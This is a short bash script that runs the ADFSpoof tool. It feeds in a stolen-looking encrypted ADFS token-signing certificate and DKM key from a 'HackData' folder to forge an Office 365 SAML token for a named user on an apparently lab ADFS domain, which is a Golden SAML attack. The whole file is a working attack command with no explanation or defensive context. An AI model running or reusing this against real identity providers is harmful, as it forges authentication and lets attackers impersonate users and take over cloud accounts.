#!/bin/bash

cd ../ADFSpoof

python ADFSpoof.py -b ../HackData/EncryptedPfx.bin ../HackData/DKMKey.bin -s sts.ciberesponce.com o365 --upn rmarlow@Ciberesponce.com --objectguid {803f3947-5471-476d-b970-f3eb3b30e1f2}
